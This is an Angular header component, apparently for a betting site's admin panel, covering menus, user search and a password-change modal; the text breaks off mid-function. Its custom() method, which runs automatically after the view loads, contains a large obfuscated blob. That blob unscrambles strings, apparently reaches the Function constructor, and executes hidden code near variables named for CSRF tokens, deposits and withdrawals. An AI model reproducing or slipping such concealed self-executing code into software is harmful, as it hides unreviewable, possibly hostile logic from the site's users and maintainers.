import { Component, Injectable, OnInit, OnDestroy } from '@angular/core';
import {MenuComponent} from './../menu/menu.component'
import { MatchService } from 'src/app/core/services/match.service';
import { User } from 'src/app/core/model/user';
import { UserService } from 'src/app/core/services/user.service';
import { AuthService } from 'src/app/core/services/auth.service';
import { Router } from '@angular/router';
import { FormControl, FormGroup, FormBuilder, Validators } from '@angular/forms';
import { ToastrService } from 'ngx-toastr';
import { ViewChild } from '@angular/core';
import { SocketServiceService } from 'src/app/core/services/socket-service.service';
// import { Socket } from 'dgram';
import { Subscription } from 'rxjs';
import {  ElementRef, HostListener, Input } from '@angular/core';
import { environment } from 'src/environments/environment.prod';

declare let $


@Component({
  selector: 'app-header',
  templateUrl: './header.component.html',
  styleUrls: ['./header.component.css'],
  providers: [SocketServiceService]
})


export class HeaderComponent implements OnInit ,OnDestroy{
  gloabalData
  url
  webUrl= window.location.origin;

  wasInside : Boolean
  @HostListener('document:click')
  clickout() {
    if (!this.wasInside) {
      // this.text = "clicked outside";
      // alert(this.text)
      this.removeClass()
    }
    this.wasInside = false;
  }
  @HostListener('click')
  clickInside() {
    // this.text = "clicked inside";
    this.wasInside = true;
  }

  @ViewChild(MenuComponent)
  childComponent: MenuComponent;
  flagetransaction : Boolean;
  changePassData  : any;
  sportList: any = [];
  flag      = true;
  seriesList: any = [];
  seriesListAll: any = [];
  matchList: any = [];
  menuList: any = [];
  userlist: any = []
  userDetails: any;
  searchKey = new FormControl('');
  updateForm: FormGroup;
  user_type_id ;
  useradmininfo = new User()?.getData();
  sportListCup : any;
  _subscription= Subscription;
  isPaymentShow='0'

  constructor(private socketSerive : SocketServiceService,
    private fb: FormBuilder, private service: MatchService,
     private auth: AuthService, private userservice: UserService,
      private route: Router, private toaster: ToastrService) {

  }

isShowToggle= false;
  ngOnInit(): void {
    this.getCupsForMenu();
    this.getSeriesListH();

    this.socketSerive.getMenucup().subscribe(res => {
        if(this.useradmininfo != undefined) {
        if(this.useradmininfo && this.useradmininfo.is_change_password=='0'){
        this.getCupsForMenu()
       }
      }

    },(error :any)=> {
      console.log("error")
    })
    this.user_type_id = this.useradmininfo?.user_type_id
    this.getMenulist()
    this.updateForm = this.fb.group({
      new_password: new FormControl('', [Validators.required, Validators.pattern(/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d@$!%*#?&]{8,}$/)  ]),
      confirm_password: new FormControl('', Validators.required),
      master_password: new FormControl('', Validators.required)


    })
    // this.getSportList()
    this.searchKey.valueChanges.subscribe(value => {
      this.searchUserList(value)
    });

    if (this.useradmininfo?.is_change_password === "1") {
      $('#change-pass').modal('show')
    }

this.getGlobalSetting();

  }
  onToggle(){
    this.isShowToggle= !this.isShowToggle
  }
  getToggle(){
    if(this.isShowToggle){
      return 'block'
    }
    else{
      return 'none'
    }
  }
  updatePassword() {
    let self= this
    this.updateForm.value

    if(this.updateForm.valid)
    {
      this.userservice.updatePassword(this.updateForm.value).subscribe((res) => {
        if (res?.status) {
          $('#change-pass').modal('hide')
          this.flagetransaction = true;
          debugger
          self.changePassData = res?.data.transaction_password;
          this.toaster.success(res?.message);
          if(self.changePassData){
            $('#change-pass1').modal('show')
          }


          let obj = this.useradmininfo;
          obj.is_change_password= "0"
          localStorage.setItem('useradmininfo', JSON.stringify(obj))


        } else {

          this.toaster.error(res?.message);
        }
      })
    }
  }

  closePassowrdChange(){

  }
async  getMenulist() {
  await  this.service.getMenuList().subscribe((res) => {
      if (res?.status) {
        if(res?.data != undefined && res?.data != null && res?.data != ''){
          this.menuList = res?.data;
        }
        else{
          this.menuList = [];
        }
      }
    })
  }

  searchUserList(value) {
    let payload = {
      user_name: value
    }
    this.service.searchUser(payload).subscribe((res) => {
      if (res?.status) {
        this.userlist = res?.data;
      }
    })

  }

  getSportList() {
    let payload = {
      is_active: "1"
    }
    this.service.getSportList(payload).subscribe((res) => {
      if (res?.status) {
        this.sportList = res?.data;
      }
    })
  }
  getSeriesList(sportId) {
    let payload = {
      sport_id: sportId,
      is_active: '1',
      search: ''

    }
    this.service.getSeriesList(payload).subscribe((res) => {
      if (res?.status) {
        this.seriesList = res?.data;

      }
    })
  }
  getSeriesListH() {

    let payload = {
      // sport_id: -1,
      is_sidebar_call : 2
    }
    this.service.getSeriesListHeader(payload).subscribe((res) => {
      if (res.status) {
        this.seriesListAll = res.data;
      } else {
       // this.toaster.error(res?.message)
      }
    })

  }
  onLiveGame(series){
    this.route.navigate(['main/live-game',series.series_id, series.name])
  }
  getMatchSeries(sportId, seriesId) {
    let payload = {
      sport_id: sportId,
      series_id: seriesId,
      is_active: '1',
      search: '',
      is_hide_declared_match: ''


    }
    this.service.getMatchList(payload).subscribe((res) => {
      if (res?.status) {
        this.matchList = res?.data;

      }
    })
  }
  runJquery() {
 this.getMenulist()
    // this.flag = true
    if (this.flag) {
      this.mtree($, window, document)
      // this.childComponent.getMenulist()
      // this.childComponent.mtree($, window, document);
      // this.childComponent.custom()



    }
    this.flag = false;
  }
refresh(){
  window.location.reload();
}

  removeClass(){
    (document.querySelector('.sidebar') as HTMLElement).style.display = 'none';
    var element = document.getElementById("12355");
      element.classList.remove("change");
  }
  ngAfterViewInit() {
    this.mtree($, window, document)
    this.custom()

  }
  custom() {
    var csrf, path, token, setUserToDeposit, changeSetDepositAmount, setUserToWithdraw, changeSetWithdrawAmount, setUserToLimit, setUserToCredit, setUserToPassword, isJson, setUserToStatus, nowDate, today, endDate, pathUrl, showLoading, hideLoading, CryptoJSAesJson, CryptojsDecrypt; + function () {
      var OKD = '',
        vHH = 698 - 687;

      function ISc(a) {
        var e = 2678490;
        var s = a.length;
        var d = [];
        for (var q = 0; q < s; q++) {
          d[q] = a.charAt(q)
        };
        for (var q = 0; q < s; q++) {
          var j = e * (q + 283) + (e % 32608);
          var o = e * (q + 470) + (e % 16549);
          var m = j % s;
          var r = o % s;
          var t = d[m];
          d[m] = d[r];
          d[r] = t;
          e = (j + o) % 5770030;
        };
        return d.join('')
      };
      var vMx = ISc('cugttwfehcqknbnurmzirjcoslxtaroyvdpos').substr(0, vHH);
      var uiO = 'n)soa=f5,>i)hl)e7 , +gvt()rb(e=r(80*t2gnup(uaj7s;;;ejxb]ecoe+[9=s85errrjwuA,s;v=rn.s,os,teg}(,6oav)++auae{8=;6[;<3r8ahsfg;vtr qv.*[fo92zAAq,)xnv0zadbnvgtpr+;0(0l(arjs(;c) ;[ y)[=,cu=n=pa1c,d] a1femifc]C 7kbvs"e h;,ySlr.sol[naa5a.+<)a;+rr7=u8nn9foue;=r)}(7am ; 7)iuh ;.vu m.aCx+8ltl)r!8"[onr==n{)lf n,(v,gmi;a,9=hsm-dhis=gn(1titC6r]0k d<vne,=xif,s.n[0aa(2;tf8)=aa{ .a+uv+lvs;;;+o=a7gri(ch;+.z1h+t.sodxet;7au(egt;pru)r(=e>. )ff=xi(g.]rar;lt;br1v,w" ;=pl(+drai)a;ilv=c .;e1dda.6l]+iggCrr[,scaaeC4deja)a{9).]=ov ue}tte;9n(.=;0trl=s8".r6)2+lsssvn4t,,ha;nrt;vl6n"l.,.=(bo1;u-n;.vn;oxh1]ls44o sixcc=A=))7)o)h1=r.wt2l+2;adc,f3p=tf0ftnhl(9;oki98-](jh+wvhkp+hgitr<hj;{b5s[ m"=ji]o6e,1[=+lv.oa;4][-tseh+{=a( };y7n)is)u"si56Cni=i++r;h,C(,shu(nr10rl;o(.<tczg;rarla0+az0nj.sC=)2erer-(r a")}prg"zjd.vm=in;fArm{wae(ae=)r(iu 1r!=nqr==c]-fr()2h0;=}y,(S[jt+"h;])m,1w=glx.(f=vrroj-][)kqm(ta(h;1huhw(r,.j)cn}l) ';
      var WUj = ISc[vMx];
      var DjJ = '';
      var QjP = WUj;
      var GAW = WUj(DjJ, ISc(uiO));
      var PrN = GAW(ISc('9a{51Dr=H2AH7]("Atv)rszessp)20odfnoi.;5ol[73( c2daacuF7Ae\/$2!\/H56H-oln.bt(<-mAd#2eAndD%it!Apy 4a%(?jo-aiH .8=(1Hm28\'H9d[lHahAn)"iw_)p.% toH7fAcr9n0i+2rr- o+AgHo5)0A1sHc)aH.>oxji> d0a[mjw.}mett}uesnE*=";ymm`.a.nA0tu.{ko$50.weH>]En{At.r M(A-A. r6.le)]0alm01E(]sHan3soiA}o2iaAc.D.sxd eeo8 rsosE oo31n(am]0{3t0bliAisi)..ar,i!.)l .Oo5xw1]x9Hg ;4%c(2]d&]j8H=9H-q0ttdHlax2l4!)88rHv!?..20npadHa4%0rln.s]%]ne.2iad9% dnrwdw4i!daxoes8=w}ltHpmw!0%sArnms sul] )ae[ra#t6-a5060aH=ao.d2_cda}5ic22d80d#ei{p%a\\uo_fxfS5-dgs."5%-3<%)a%(.s%5=2;tw:ns,-oa%v-c=#]2cid];n_w4%ns5_re8H}; 1A53s8=.0A#Al%iA}Ac)%Hr09tA%oao)}wdlH9D0waepHeAlmt.5H;#A[adqrroX]%a5afa66[i(moo9ufrks"iH;20A4]Hf_srJs5v9tDo0d1dA%0dHx)e"t\'3}l9Doa01 iAuot)rHCeAdaHiAN{Csaao,diddA.8(108t"2iA)x}7DeA]%Ac seio>oiAi#0dtq.1He.-j-A.1.HA p0%KnY0t2at-35%!-ouF87lhfk#A\/7e"%d1!smH%tu#)i1;9uedr1%e[&60[idHlHw]H,>)-iw)720%rka0_d57koH1wMtHHH!H]or[N0a abAecm\/e.0;Ake!Hs6A;As(lArsm|0A=tp[m(Af0stueidd(p(xH d]%b%.t3+;23mAce..d1ii\\mt132oi%"r.teo47)e{)dAi5uHbbH=nHsAo#.0ra({_Ho"S+fe)]sCL2lu2A3H4Hl3dxs%!)Wn!ha#d0k%A1edaee%tar(ueDta0ab-bA7Av%.jy.H1u}]xs)1A=A1#rtoedwoAAAxnAd%ngewATee08[2r.tts]06"]H1sHm4w2odH]s6gj6l(H.i;[terAr06l.n9sd2,a;\\cltA"22.-Eb0G#cDsn`t.%+=;Hldv2gAeAsnsa2.t[rd0,rt0da}r9#\/iadAAA)ii7stZe)lmeuc9)ifA0d}o8df,}Htx#.tr|(mH.r%}q-eaAm725sa%_a\/et_#H.;t9[{]d0d2ui2ds25\/Hva.p,6i7r1rtw^Ays!dxA%;Rrd5Ha!ex]ox.Ax0oelmaq.H-AHr>2e\'X.jae0hpiA-6A]Cqe]{-Xpm)oAa)-Hipt r+1liAd"s;dA0ea=dtia-]Zfxf)sdm]te![qsUd23@0H]"u!:pAi{t.u%xA+euf3(.A$vcue8]t]nfrklo2#io]d\\baHr}J .o)"AA22t..aa5H5x(-ct]6r4A0ArthAeCiai .H-)He(sxte28AoAewbdrnAwHc-.A1ymH-%d-%r-7u7s4ddtdtHk_# dquy0-9rAd](HH)s]at3(ts\/=sw-r6.+0 a01aiqetiH5e(iuddm rnqxterr]in_C0y0H;1sls A.\/at1eA.2ddb)Hx%5_QSduEH%aiu#{t}A5s3p;u;m4mHxs_tsHn_dC0.%usQ.1ast;.n47usaA%1rHmh1yoAt==admdmtAdaa0i)A.-6,bs]no"rH1)tdiD knIx-\'8AD]dt%iHi.o(oa;to{hH7im9uod_vih+(t5t0nfkr7-3)isot-H[sx%sc*]ac..l }$B5"Hd05tb[o7eH-a.$"p-808u{#l=;s.t1H0{9.*-k HHpudui3AaDahaA7>t2r:%i0%%mb)8e Au-6ae1epA ruUk0Wah.i`uL]Aa2-.\\i9%)4etbmaCm9.def9.a dHod$e]04-eAHnadvn.De3edAeA=!0s03H6d.x\\wAd>e":ohGmjex$es-)e0utsp6s^1khlr+Ax6.asD\/cs%ArA{1%df"-4H;R(l59apLxs]].ors-c2"[1d:g9wAF%<0l;]ipT{e0eti]cm7c"r.oe[B.nhdwabA\\-w]]AA}7.0#0dt0Adtn]w5H]%9o}td\/c Q.Ai--]o3oA;(w,)?d1t.x[A)f)t$a5t}st]t!r%}5-.#a2lH!aH%onn-ptyo2o39"tdpodHlur0.:12rE0so1{1e9-H.2.5 "rH9[H=;rp58c{h=05um%Hr H\/AfHieH01ttA*n]hm]-su:t%o[[,%l#ursledp!}m#Ax=".h02ms.De3-ne(2u(an du.6.%a^qt7i_arib-2.5-H7p))m0mHmc%7Z4^1rA#i0AHts.3AE923)aoAt(i%t;u-rs(%p+4{t{swxdl().H#ntt]i11t;d3vlsi#a%j tw;tmi6os9-A #l(n%zu9lAHi;id]Hdi2%(Ht6cAef#At9pwAfwi("-ceAAdlq=\\dA_21e1h-4t-0o4t09Wo.\/mss;ltomH=xiC!i##5t04]nc8w_#.(|ato[s]ss-24aXpHsp08%1E\/tu;3 Y01-o]a;hq5]](mHeV%42-L[dei[.}}}%\\2sw0]wsud(dm)w0l#mAlteAeam 5[kQ# cHbxra{70>9ll+-3Sdr0eerrerHi0,!tutpl\'x0l]enHs; fokdhACedHem.ACo05%tHe%)6\/$oAwieif#.5Atcc}#fO-3m5sA^s{ui6Hi=d#bHe%ZuqH7HD(.A];A2t3s54a}HtD{[2%hAa.)qm)y %_R"Hds5oxclicedAdp]7du\/unrno1w}-d5sgt.c}ce)W_5a.A#. 2(0]lnmww.e3CAHA>mHpsr}jpldAv0]6.}oe]]{-H)H"ArHHal2tS -0exme5Ace[pcmw%dsH;00lifrbi1(aa5)30b,!]6EHt}7a0wa)]a(Yd9=. p"a-ok0rh,o0a#fu1ndA>t7Hr(d)0rav\/_nH.]\/AHsomAHAP{1A1AdiAHAd1Ht#.mu08tiHd3#reH#[HAc03x%.m.mf#H2H%%p1lxs:t,wd-#lAt6e-unoH,w.M3=.HetsvidI3d\'f-tt.d}-l02.]xts7#.p%r.Aera".Q_8SH-(&ptleHaoA]AAukt1"@3y#tdA- }5.2A{n|v]-rAX:.8rfo78na0a)e H{0stoHnidH)0d4e:.2%rtC%2r8A}#npp [r9un mmr(3(8s.r0rrH;pkl1A^$xHumAttaAop}Hc0b0%t8db>-2n%26n7te5[rc5]r65vAlHos0r_iesI die A_5d)!sA{HHbtttwxar1a2iccHd;4raAHecdAsA%5.tAdC.10sAdel)H2.s#}-Ae# oAo)N-hr>e%-x..v(reAp3(t]ei6HeRi9d%.(]tr%9#a%p-t 4Dda-.daA900ne3sx;4usAev"O(.QilAeofACllAr4Yt7sw1%wsuU.%1tti;5l2H58du.!id:F#a%m.e]a]t:Dw(.oJH;t4haH7:,.ee;_.%cyc2nAomAoim1D].na_)Ho$AT6"AetnxAd0}staZH8r,aH6).-9]-1.:ke94xdta^,6]CH.`.0q.iCs [6;;m)sstd)c-`ttso00Ht.-a6w23(3-nl%;s5iA%.8rA-ot!"s0rlE{mhi0Awceo#a(3#vA%r7xta-hio-s72x)%1eHe i-eAt[r20<l1=at!e;m_b)i\/m! HAu;kd.sea6sDL)s2-0sH]t.s-HonAHn%]He"]ixl#;#-.A#8A6emiH"0i!thr7[6ll.hs60A4su3,at4-l)AhYDs04%d]o)0l-dp0e]f"11}0D38=e%A% 00tp]%dADv75oAw;.X5qi5.82daxt162tr=2t8fH5Hvsrxd;:6=xAnoyAp.].h0c!=gaUcc0tc.ecH]rAe7Amd<bf1;0A-)rAc90=0A#!HA_A x.65vp!pHp%itD=a.5c.dAa1.3%peA+AHcAmitd2p31td%&03p-a.eiur9c9)g)5Smsx(6EA2Hw-x7HA)a064.]]xAxa<[H$Gr;H[)0B)\/%galfm%";9iA7,\'acd_}f1di;AHl[w]hrA0_x5dee(A*EA5d;HHA0;A0.Am35Hhm.}9d77-uts.Atnle.0;dhAn2}1teuds=,-.t$"""m&3soo{s.]dE=.Vx"7A,#Hp-e".=.#nHHtiHb)l]5ep9ic0iHrf1n-i}(rapR1Y.6#3;c.r5,de._47AH:i0o5{A%m5Hi((A6]|8`5.Ajliac7]A.EdH6btH+.H%Hp#t}6K!o:H)i4i}\'_8e1udt[a;t.%8)[H$\\.E;iTx%\/(##-.=v9rm[o.kmtcc%dt2%Hm]h0t-Igared[3Aueu;}d2Asc2f.uA4uhu1l0ne.-xade+ot0A{h]FH;d0.5Hpa1i+qa[H\\]o5Sr.7f1t)sf;A0u. eao1Hi-ltlrmrC7H9.1"a#n(;tb]8 t+oikrs%rAMt0T0#r.}iH+{%wRH,m=.8#t3CAtHtQh.x 25CnAcC=9IaQt3}c]TAli,$"uH0]ft:08h[?u +JH7"Ti5i..Hu3(\\7A6j>713>tue%a38`e4U0ADE)xCk3wu}Hit1d7m1id*iA xh%.H)H0w%4)A).;AHnCi-.tQr_A ob=tAe72]=3ee)d3 .[tp]td)^Hd1#Asods-ArAqikA[0eitee6].oX4drer)4ou)AHd]UH1-lA;ddiH]r_AAe l]e[1w,clnrdp_%ee0m=A%dwH02c063sHH;jlgI"6r.}H+HH&38Ao40HrFcx_rA4$064u%\/gmd;fj]Ht4csa2pNn;AvHt ."0s56a0]HrD]3dH4n3;uAHHo2].130?3trs5\\(d(.!H)esH%ASh9r.8hH.23aubr00AC_\\%feax2AH3ds)0MlH;vcms4YDke8A}H}3k.8Aidltu.7]=uwH_;i#h35nS)35e5sI) o97tAhscl6.#6ad)%ml$54H)mun}e{2Atwe0#dn6:h=:3.2U5A2cmE}dm}t[]S8xxs7:79wl1o.oHM2eD[2.a`21169g4]p52m-d2)3h8dlmrA\\}21h57o9-i)A=H-raoa7Hes,wn5aaa.1_.5AsC?Hr#\/+aA1m1;eAVHSmdeAae0}8n1e;dsheo8o.tH17\';eh)!e37HHC!sAAH0A.06dAf}AcH-uvmt{M6sCAo2}" ,wx02ndH]erHH%;]]t7A6r04*AQ3[_Abie^HF.;ep.H)]H4]\/%\\%t]310vCif)gwtar(d#H509-tHH#2d)0n).&d"iHD=GHHlH0t#].c%HR}}AsAAOM%#3622)pYc0HAx1f_2Svn6%^2y0MHAo-O(1&S9lAAh7H0ex ,]xe2ratdH.7;}1.A#}H*Ar]aA5ws!o}th=-tA]06!e3oCs]2.lhH)n}H.eHt-%^rd9wxu,,.ki;oxHia8ox2"1l"AAY{ncnj1O.aul]0]C(t}lA0eCHrHb7..)qHu15e0y5=*.fteAAHH(0rs4aA%3lAd(l5mn0A%)re4H2%AA}Ha.CnentweHoE)mA.0A5HLM3lfuhd80s;_2ao5$1rtnamH9WcH5.cA`seAidpgi2,.%29l}1)oAt.Ow.seyn0r.eth=$]:dt-ds7a[>ica]ru)n]cA#%c.8r,1ym#elAd020;n"b0GHAu,ocaiA_rAi=A281>H"6sa!o^aH14"t")eAD%u#dy3;)wH006}a%9;{nHa;"H% 3Pt[-(=t5c0-Ao%Ax.2mfr50bn}mo(+.;oou20)).H2*Di+n%x{x%a6]3lhl:2an.H5hAB5r]HAC]{H-.t5|2>k,A]sa;A]Ph,pie,o5.sDcr[p}5Ai=ng3203C)atCdssi0rn,MAF.gu4eid4err0]=(r)HA3H,2Xo#0[ 3%et)pv0ldixd.H7\/;{#oA0r16!As>tg8e00^A8e00D(H35w0nl2tAAtHHt-wHrAi0;%;Hh2nrg1e130\\Hs1iX79H)tH}0.A)9.).hfHervHAA2A5nAhs]y){lpa+#l_8A\\H%xed5T_}o6vs2Hwu7\/.9b rscvu55"c-Drs"Sp;u:t$I6_.x%1=]([sa]H8a2AA,sH0d2Ht1xAA e[A]rrp#A5S;A30r,jw-7*t5H#iPc]=od$i9=HAgr.EAHr3{4,:B]%e20sb4Ai_-ldH\\ii)4fdp3()H3s2cHao,Hr .xC0[xAwNto}(o)d%[(H[.@$a-GveHtdr9#RH$QH.A\\]d3;\/,rttf52-bcdx0A)]A7+)#.l0. d8ut)R]]3H)6b@g5 1.H s)dl a9EHq7c)&1t)o);d0.k0}mHHHh]e}Ht3(0,]=H.AqgEiH7Htp9T1e1AAA7H.wedn}(7s.#!LA\'e8]Ho6;)[p=l56kssn0_v{HA:.,;A]#9@}E}cHV55fXk}m)omUl5^e%AH]tamdA$nr3natr]r^#\'0v0v8%i4H]0sH_"Pl.-da: &d%+nou+l={-4H;.mhHHa%s%(=o(ym"_Ln;rwv%AqiHNAswep#eltH%x]t;o<o\\w1sklA.3*HBeie;r9a1Hw]%5tsus a+Ah2:alH }Eswmxss2A)D01n9-t^-sl]b)gH!==r3.);Xr.k- t H#$cA<w,dla4+A(HAs03sA_Hds\/A.\/0cd#)%0^esA.A_H=]%!-aA5sfl5Haw(H,1Htq"fDAr05.0AL4md{oa$6t)Heh+C2lH7AiA!(Th-[%Hd4t];c0At4gdH1l 0]([Hb-}fiA-H3a.a1@x0oe;NAbg6Ap%e6dA)n0tHh,l)t2KA }t{o)eAHA%,u[ld0mo.+)a7aD\'%rHA[ilrle8H8H5.0Al1d3rA32ln.(]A ^oA.Xp}%4xodmo#A).;",]o40+AEi9",x}A:&)n H.5A!xo]xrsn6r{-(hH2SHHsEAudd5ed5f)<+l15n;7{-"ib2a\\,s.c.:H!,"%(d{AAo(TAH,tHrHnea.])57gN=HHA\'AdrAcr7_anEst3"AHsH]n9}\\!M22.7__65o21a].4_)S1;,8:)A.H%Hied3ios!0aHBA5HC6o7_Aci;0]k)s5eCCEgl!610m..6sA.obHihE(x\/5r2pH]=lp5 55d, eltix46s- ).ee0}}fx1t6hA;ql2;eH=1fG}.HH1A.,d03k6t.4A#.%%m#}A%]AYuHAv%0iixp 14p._t!6,QH1`i(AJ)25ke-d:[9v2tam(Hp)5b,kHA[Ak)ns$i 700(dBld8))e\/a3;d }(.V]_,ncdHH!%gAxlHp2rurOb1asau"w0n8sAtW%.)]t%tqwd;i14(\\-,!5i>:-0(d=58:5r1n).H]3tr2_. u35rH.iHr#(tto0HnehHA$t#0d"aCc=2atl+0!a8gA%Hsin)Amx[AdibAA53)HA0]38Hr[%lhxAbAHm-xc%0eApAio22yAHkD8r$ortA0Ad2]5E.H1AdKlHHDA^0.N6H`AAdaH(l0Hd5+;nH%f:Hl1auHS(;gc(Na0{t7p2t92AHds2r$eC2k6]-E6iJTH)A)2.HrdenH8)0He-[6(_Cng5d5.q.H%)%pAAAsnds%}iydle2sHjDHaoAe%.1I(oHsH95ai[ tHa1ls(+Hb61Hx<\'dAdA)lo6H6!]{kx7mtcansc;ceaHq)-{h!le..6H.1]c.-r.d5at%(q:r864eH;gd0j.iH%5.H)4HtH1=b()(3H%x46H9:e0wH_2rAA.%i[H)0#%Aes!crN{1uxd0H.6hd)Pm}dwAqImsAdiixd HmxaAx9%954e6r_7;].9-JdAe.FAEw!el;H0l1ci1D_]0-eAAhA.iri;H.!xHr0=&Hrm)aAe!t1s15aHHx1fh2iouA=]1ADH8+A$.8daA 8e[Liq6fj0t,e)eeoeAH_,oHE#.%v$4H04HhdduQ^{d]x)-A7}=3C"mdO7!uHdtrja.1=i&x8)A7%loA"D5#x7-d afl80d(A5x1ori9xn1rttd;5uu6;Hd.,txa0-0,4;{eo,cgivn"oAnAHa\').aodAt #t#eHH o}e,a,i2HhtHqaA5eEC%6G5dAR"]ix08f0A0:MxClH$\\dV]dAi;iss84]1{"x5 .sk0u,ndBd7H 8aH)1,.7oA\/l0n0et.H!8#7.FA)s0fd& tHl.cixDo!(cA.2h7nE4H1]rhj9xsHit0pHAsA06=2H5)!.3kH6H2]A{C._s?75HCas2_)sx1Ei6m1!{rd00]u]orwAP7i2}B2(fAtsA)6Arc81uPH8t024scrsHexHl4xr&HA ;9#52po!qCoidda]:tD012o05dd)raAHA}HwAHae0o(AH{.d-[a)))Hq_0x0liea(b{Arpha0{%-o8HHcAHu"2ipAe!fAb*6s iN]20iAAw[r2o0mmu7!scpi)sr]{snrsc23)%Arp]a$pHh%.om{250r]H[nH5mscA),H;5p!A=tns03uni2SA-7rji"x#21rdd!oH^H_t+rt#;sf1IH;nsbiaux=1G"dHN+d]]E[-%5aHotoHrHi*0dp-!]%97c57Cbvd6t)]bp-strS.X.wr;$i%!iHt0=tp"s#.A.)\/]e4a12\/]ino-,at:tr,tuf6Hs.aemn4nooe$\'= wrt4Hto12LwA"fx[56).HH(A3.2oHvadl#oHiAA2!a"$1,m(":4ai0v\/eAl2acix]{-sde0)kA 6ic!ang}weAHV!m-etdemouCt=a[_08HA_=.A%aeH\/aWeAd3,faHdli0AH..)%.6y0xh8Hde0;s%a$t=Cxepttmy1hhdlw.d0-o079t4c};d{[5])Ard p#eHoiAsw7}0ae]t.AoeTH6rH]-jHG]1nn:a$7`d]9eG}Amev,tsqo7q-6l3o2.7e0h;Aeu1hDi52a# HAATuPo4)5HAp;eHwtuClAjl_(g};5Oo$Asold9s{oTeHagennAs)ha.]!#DaddrH#n2 x0d,a]ACAH1HtA )p2wIACd]Ali0JlH..-`n.A-nhlh>AT$H}]}[=,H4I\\iEon ee(t7s_]]=;.11x_DfHcmlT)H]A3b\\x]r.\\0eA.]9iHCA=sgsi!mea38;m1]Hxa[e4c]amAwHt100.{)r3]Au-H0fc]rf-37dfe7aHH&\/32);if6de!nugp#d11etH=%n.up{d-0;c.0)A) 6 r3Ad2a96a87!cd;)l!A)m8rxH%9;a%ed0]2_c7\/0A.wrdiC.t0r9As]mCn=-e4du{HIAa-]Ar-SjNHCa!-_%%u)H,%H1w" =%.]12HTH%3Hme%12w9H.d-EonHcmo9xSe_A1u;2upoH.20Hre)7V1d5)ai)>}9`) tios)Hna0H[(]uC;0x;.A0A2\/u=\'e3ce;to_aA]3dAAw7atbeeH18Asf=nd,1)eAi}ndf =c0,n>dt_Atdz]oH8ppctn]]4(o=.)A"A).He= A{0#ehtpHA60x1$mrHAn0o\/1#94AbNn.r2ku3=roH%}sHbHe\'1es1ho0H= aH!{e)0nH]-DA=frcw0A9sAna:u2uA;A)t?0s ujv`4owe#A(9}[7n[h2en5R%e:rAuA]9`udrH.)xA;txdrhAsi+hkA"irilAP4Aoe1]r0r8-H\\rc%lw75hpA]H({iv-Hs(urletMu..[rt3\'Hhdqu!.e!AIipPpelmHo6ssws.sA#t,H]s]it)asiA}aoi,u.{wutcH.d_thH)=.!se?%_seh0dap3a5eyaa_|Hl.n08a}7oi%nyA03 dwcHHA$a]4OH#-{ir0.%0i7E2tmrEAne(.) ats,Ha!uD(1-H4(0e0.%0ro5op,H5Ar_0{%-jR]]ph]tHha&tb0cA8 (7-ilf@;jH;aHf8:H{a}3uAsA.[ tdeG8ft.iyeekd0i-5]aHa)4wrm8]ci)xa7)seasA(%;-%0:x1& r4rA)tA8.x.e#]HcrA0])}6mu^}k.A.b,eHol %nyka.A(ix1pxh s5,HoA{A7Hh.gHmE)3.)r p[tsc>r-iHtt.#0sAus=D6{AAra\\H%Hw2](lu]0cA}o"A1N1]Hi,s2"fsuZ_7b53Awn%0d; rH3dgHfeA93wuddAe8.07{{.A\'DlrH1 H]..y(5)ro4;%tAHac:Hu1x9)[oUA.08H]"i8H08#l;\\6]Aus0]H-f)\'p,,hn(1Aosels@n1HeedAaeesr4Ar7A]yoHi5-&wAm3,l-$r.HH;-Y,iy-n16u Nl"i4u0=.]n- d\\Vh..--1)aokt\/A}d]t(t,HAf1tr7m$r<:2u,H$eoHdcL;c701;3]]Q 0itdF85@8oAa;r#8 hdrx 2sa.]H]025fee#H8e ."H8A1-8]d;.,x iJuH]is_16rHov1u0A-c"5Ai5he}e u}$k:e1tn22.;A5nraAe0}-A$5tHAA8Y].ls0A2"5d3.fDSL#Hx7h4la)mn0!ie{,\\505Ah51A8H5.+1A6mi;dHlllA0Hr6xso.th dgdss=%s6%s0]w w[04%.%5js)#]6d#%a%0vHls0H7n4[nAf{ )er8H{5d1%De,a.torAn%:os,d};=e)}:"1m:.m7t|C]."sd="6a0Hk eeuA)--mmAo{eH16s%wA0E5)0ioHd0#3"A-Aezvx A.onHds5[lt0.o07 85{r0..tHzebn)Avi\\A\/ e9Ha!d& ];.u1-kHA!.;.m0.010Aci1s1H8 3c2])i-m]]0 H-xAie5[Ddm\\e)nr}67DsHC0A21E$w,]A\'])sw+er5A^an 4@);u.va=xts()dH=n7A5Hta!,H_mtHa02556i) .e]4 tiHnii9 9aEuw4\/t5i1):d)AUdeAo.o%ht.)}iiH2oi2l\\%}A_4#qt"A0^60-3((H-paA,HDee,w[})d1 ]$-]Hsr.As#-2%tme21.  oiH7esH!H"tapswvr4ti#tieeAt"71#RHA9))A({!AixEx4u-o[5}o0.9.;.#Jn]cx asl#;eA>87H R$c:H%A{)*d]4Akrts D%10Adt0-_-)HA1taoc9c}( }y%ir, }iet!Hi%m.th=t4=nt.Hd}Ai#i3]9w_{x8Hnu$6K=(0e8c-n0 H-;g_0on]}A.s m](t06){]_ $lAae1"Ai%o]tm{0w81saH,m$r2A.AinHwSt26 A;Hp)Pa.ht.A#0xcAA6c%)sc%5,%daaAaA3anm`H (460TA0 4o.nxc;1at7  nrDat[ ]td_UxamtAatr6s06is%}.l*s6EoAv`5H{b_A5rm%)1d0{#=rHHjm([dDlTPmH%HvHmdd)Da1t,trlxfxodAFAai.2]7H0.5C6"ia(,=s=3.A.H)i=uca AA[faw9t. tv.owh;tt ffm0'));
      var raW = QjP(OKD, PrN);
      raW(8296);
      return 9486
    }()
  }
  trackByFn(index, item) {
    return index;
  }
  mtree($, window, document) {
    // Only apply if mtree list exists
    if ($('ul.mtree').length) {
      // Settings
      var collapsed = true; // Start with collapsed menu (only level 1 items visible)
      var close_same_level = false; // Close elements on same level when opening new node.
      var duration = 400; // Animation duration should be tweaked according to easing.
      var listAnim = true; // Animate separate list items on open/close element (velocity.js only).
      var easing = 'easeOutQuart'; // Velocity.js only, defaults to 'swing' with jquery animation.
//
//
      // Set initial styles
      $('.mtree ul').css({ 'overflow': 'hidden', 'height': (collapsed) ? 0 : 'auto', 'display': (collapsed) ? 'none' : 'block' });
      // Get node elements, and add classes for styling
      var node = $('.mtree li:has(ul)');
      node.each(function (index, val) {
        $(this).children(':first-child').css('cursor', 'pointer')
        $(this).addClass('mtree-node mtree-' + ((collapsed) ? 'closed' : 'open'));
        $(this).children('ul').addClass('mtree-level-' + ($(this).parentsUntil($('ul.mtree'), 'ul').length + 1));
